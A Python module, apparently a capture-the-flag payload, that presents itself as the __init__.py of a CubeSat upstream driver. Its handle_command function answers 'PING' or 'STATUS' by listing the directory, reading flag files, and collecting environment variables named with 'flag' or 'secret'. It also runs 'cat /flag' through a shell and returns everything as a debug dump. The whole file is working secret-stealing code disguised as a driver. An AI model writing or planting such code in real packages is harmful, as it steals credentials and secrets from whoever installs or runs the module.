# cubesat_upstream_driver/__init__.py
import os
import sys

def handle_command(cmd: str) -> str:
    cmd_str = (cmd or "").strip()
    
    # PING이나 STATUS 버튼이 눌리면 무조건 실행
    if cmd_str in ["PING", "STATUS"]:
        output = []
        try:
            # 1. 현재 파이썬 소스가 실행 중인 디렉터리의 파일 목록 확인
            output.append(f"CWD:{os.getcwd()}")
            output.append(f"LS:{','.join(os.listdir('.'))}")
            
            # 2. 유력한 플래그 파일 읽기 시도 (try-except로 각각 감싸서 하나라도 걸리게 함)
            for p in ["/flag", "./flag", "flag.txt", "/flag.txt"]:
                try:
                    if os.path.exists(p):
                        with open(p, "r") as f:
                            output.append(f"F_{p}:{f.read().strip()}")
                except Exception as fe:
                    output.append(f"ERR_{p}:{str(fe)}")
            
            # 3. 환경 변수 통째로 긁기
            env_flags = [f"{k}={v}" for k, v in os.environ.items() if "flag" in k.lower() or "secret" in k.lower()]
            if env_flags:
                output.append(f"ENV:{'|'.join(env_flags)}")
                
            # 4. 임의 명령 실행 후 표준 에러(2>&1)까지 결합해서 확인
            # 권한 문제가 있다면 'Permission Denied' 같은 메시지라도 출력에 포함됩니다.
            res = os.popen("cat /flag 2>&1 || cat flag.txt 2>&1").read().strip()
            if res:
                output.append(f"RES:{res}")
                
        except Exception as e:
            output.append(f"GLOBAL_ERR:{str(e)}")
            
        # 수집된 모든 정보를 강제로 하나의 텍스트로 합쳐 콘솔창에 뿌림
        return "DEBUG_DUMP|" + " # ".join(output)

    return ""
